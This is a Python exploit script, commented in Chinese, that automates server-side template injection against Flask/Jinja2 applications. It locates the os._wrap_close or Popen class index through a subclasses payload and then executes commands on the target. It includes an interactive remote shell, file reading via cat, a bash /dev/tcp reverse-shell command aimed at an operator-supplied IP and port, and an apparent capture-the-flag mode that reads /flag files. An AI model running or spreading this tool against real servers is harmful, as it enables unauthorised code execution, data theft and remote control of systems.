#!/usr/bin/env python3
"""
Flask SSTI - 自动获取 subclasses 列表，定位 os._wrap_close 序号 + 命令执行

原理:
    name={{''.__class__.__mro__[-1].__subclasses__()}}
    直接返回所有子类列表，从返回的 HTML 里解析出每个 class 的名称和位置

用法:
    GET:  python3 ssti_oswrap.py -u "http://target.com/?name=VULN"
    POST: python3 ssti_oswrap.py -u "http://target.com/" -d "name=VULN"
"""

import requests
import sys
import re
import html
import os
import argparse
from urllib.parse import urlencode, urlparse, parse_qs, quote

G = "\033[92m"; Y = "\033[93m"; R = "\033[91m"; B = "\033[94m"; N = "\033[0m"
def info(msg):  print(f"{B}[*]{N} {msg}")
def good(msg):  print(f"{G}[+]{N} {msg}")
def warn(msg):  print(f"{Y}[!]{N} {msg}")
def err(msg):   print(f"{R}[-]{N} {msg}")

requests.packages.urllib3.disable_warnings()


class Injector:
    def __init__(self, url, post_data=None, headers=None, cookies=None, method="AUTO", proxy=None):
        self.url = url
        self.post_data = self._parse(post_data) if post_data else None
        self.headers = self._parse(headers) if headers else {}
        self.cookies = self._parse(cookies) if cookies else {}
        self.method = "POST" if post_data else ("GET" if method == "AUTO" else method.upper())
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def _parse(self, s):
        if not s: return {}
        d = {}
        for item in s.split(";"):
            if "=" in item:
                k, v = item.split("=", 1)
                d[k.strip()] = v.strip()
        return d

    def inject(self, payload):
        if self.post_data:
            data = {k: v.replace("VULN", payload) for k, v in self.post_data.items()}
            try:
                r = self.session.post(self.url, data=data, headers=self.headers, cookies=self.cookies, timeout=10)
                return r.text
            except Exception as e:
                return str(e)
        if "VULN" in self.url:
            try:
                r = self.session.get(self.url.replace("VULN", quote(payload)), headers=self.headers, cookies=self.cookies, timeout=10)
                return r.text
            except Exception as e:
                return str(e)
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        new_params = {}
        replaced = False
        for k, v in params.items():
            if not replaced and v:
                new_params[k] = payload
                replaced = True
            else:
                new_params[k] = v[0] if v else ""
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if new_params:
            new_url += "?" + urlencode(new_params)
        try:
            r = self.session.get(new_url, headers=self.headers, cookies=self.cookies, timeout=10)
            return r.text
        except Exception as e:
            return str(e)


# ============================================================
# 解析 subclasses 列表（处理 HTML 实体编码）
# ============================================================

def extract_subclasses(html_text):
    """
    从返回的 HTML 中提取所有 class 列表。
    处理 HTML 实体编码: &lt;class &#39;type&#39;&gt; → <class 'type'>
    """
    # 先解码 HTML 实体
    decoded = html.unescape(html_text)

    # 匹配 [<class 'xxx'>, <class 'yyy'>, ...] 可能带各种引号
    # 1. 标准格式
    match = re.search(r'\[(<class\s+[^>]+>(?:\s*,\s*<class\s+[^>]+>)*)\]', decoded)
    if match:
        classes = re.findall(r"<class\s+'([^']+)'>", match.group(1))
        if classes:
            return classes

    # 2. 带 HTML 实体引号 &#39; 或 &quot;
    match = re.search(r'\[(<class\s+[^>]+>(?:\s*,\s*<class\s+[^>]+>)*)\]', decoded)
    if match:
        classes = re.findall(r"<class\s+[\"']([^\"']+)[\"']>", match.group(1))
        if classes:
            return classes

    # 3. 从 [ 到 ] 之间暴力提取
    start = decoded.find("[<class")
    if start == -1:
        start = decoded.find("&lt;class")
    end = decoded.find("]>]")
    if end == -1:
        end = decoded.find("&gt;]")
    if end == -1:
        # 直接找最后的 ]
        end = decoded.rfind("]")
    
    if start >= 0 and end > start:
        chunk = decoded[start:end+1]
        classes = re.findall(r"<class\s+[\"']([^\"']+)[\"']>", chunk)
        if classes:
            return classes
    
    # 4. 最后手段：遍历 &lt;class 标签
    classes = re.findall(r"class\s+[\"']([^\"']+)[\"']>", decoded)
    filtered = [c for c in classes if c != 'type' and ' ' not in c and '.' in c]
    if filtered:
        return classes  # 返回全部，让调用方去找 os._wrap_close

    return None


def find_os_wrap(classes):
    """从 class 列表中找到 os._wrap_close 的索引"""
    for i, name in enumerate(classes):
        if "os._wrap_close" in name or "_wrap_close" in name:
            return i, name
    # 也找 subprocess.Popen
    for i, name in enumerate(classes):
        if "Popen" in name or "subprocess" in name:
            return i, name
    return None, None


# ============================================================
# 命令执行
# ============================================================

def exec_cmd(injector, idx, cmd, class_name=""):
    if "Popen" in class_name:
        payload = f"{{{{''.__class__.__mro__[-1].__subclasses__()[{idx}]('{cmd}',shell=True,stdout=-1).communicate()[0].strip()}}}}"
    else:
        payload = f"{{{{''.__class__.__mro__[-1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('os').popen('{cmd}').read()}}}}"
    resp = injector.inject(payload)
    clean = re.sub(r'<[^>]+>', '\n', resp)
    clean = html.unescape(clean)
    clean = re.sub(r'\n+', '\n', clean).strip()
    return clean


# ============================================================
# 交互式 Shell
# ============================================================

def shell(injector, idx, class_name):
    print(f"\n{G}=== SSTI 交互式 Shell ==={N}")
    print(f"序号: [{idx}] {class_name}")
    print("输入命令执行，输入 help 查看帮助\n")
    while True:
        try:
            cmd = input(f"{R}cmd>{N} ").strip()
            if cmd in ("exit", "quit"):
                break
            if not cmd:
                continue
            if cmd == "help":
                print("  命令             直接执行系统命令")
                print("  read <路径>      读取文件")
                print("  shell <IP> <端口> 反弹 shell")
                print("  clear            清屏")
                print("  exit/quit        退出")
                continue
            if cmd.startswith("read "):
                path = cmd[5:]
                result = exec_cmd(injector, idx, f"cat {path} 2>/dev/null", class_name)
                print(result if result else "(空)")
                continue
            if cmd.startswith("shell "):
                parts = cmd.split()
                ip, port = parts[1], parts[2]
                rev = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
                info(f"反弹 shell -> {ip}:{port}")
                exec_cmd(injector, idx, rev, class_name)
                continue
            if cmd == "clear":
                os.system("clear")
                continue
            result = exec_cmd(injector, idx, cmd, class_name)
            print(result if result else "(空)")
        except KeyboardInterrupt:
            print("\n退出")
            break


# ============================================================
# 主函数
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="Flask SSTI - 自动定位 os._wrap_close + 命令执行",
        epilog="""例子:
  python3 ssti_oswrap.py -u "http://target.com/?name=VULN"
  python3 ssti_oswrap.py -u "http://target.com/" -d "name=VULN"
  python3 ssti_oswrap.py -u "http://target.com/?name=VULN" --find-only
  python3 ssti_oswrap.py -u "http://target.com/?name=VULN" --cmd id
  python3 ssti_oswrap.py -u "http://target.com/?name=VULN" --flag
        """
    )
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-d", "--data", help="POST 数据，如 name=VULN")
    parser.add_argument("-H", "--header", help="请求头")
    parser.add_argument("-c", "--cookie", help="Cookie")
    parser.add_argument("--proxy", help="代理")
    parser.add_argument("--find-only", action="store_true", help="只查找序号")
    parser.add_argument("--cmd", help="执行单条命令")
    parser.add_argument("--flag", action="store_true", help="尝试读取 flag")
    args = parser.parse_args()

    injector = Injector(args.url, args.data, args.header, args.cookie, proxy=args.proxy)
    info(f"目标: {args.url}")

    # 发送 subclasses payload
    resp = injector.inject("{{''.__class__.__mro__[-1].__subclasses__()}}")
    
    # 解码后的片段供调试
    decoded_preview = html.unescape(resp)[:200]
    info(f"响应预览: {decoded_preview}...")

    classes = extract_subclasses(resp)
    if not classes or len(classes) < 5:
        err(f"解析失败，原始响应:\n{resp[:1500]}")
        return

    good(f"解析到 {len(classes)} 个子类 (前5: {classes[:5]})")

    # 找 os._wrap_close
    idx, name = find_os_wrap(classes)

    if idx is not None:
        good(f"找到: [{idx}] {name}")
    else:
        warn("未找到 os._wrap_close，展示所有含关键字的:")
        for i, n in enumerate(classes):
            if any(k in n.lower() for k in ["wrap", "popen", "builtin", "loader"]):
                print(f"  [{i}] {n}")
        if not classes:
            err("列表为空")
            return
        # 默认用最后一个
        idx = len(classes) - 1
        name = classes[idx]
        warn(f"默认使用: [{idx}] {name}")

    if args.find_only:
        return

    if args.cmd:
        result = exec_cmd(injector, idx, args.cmd, name)
        print(f"结果:\n{result}")
        return

    if args.flag:
        for path in ["/flag", "/flag.txt", "/root/flag.txt", "/root/theflag.txt"]:
            result = exec_cmd(injector, idx, f"cat {path} 2>/dev/null", name)
            if result and "cannot" not in result:
                good(f"{path}: {result[:300]}")
        return

    shell(injector, idx, name)


if __name__ == "__main__":
    main()
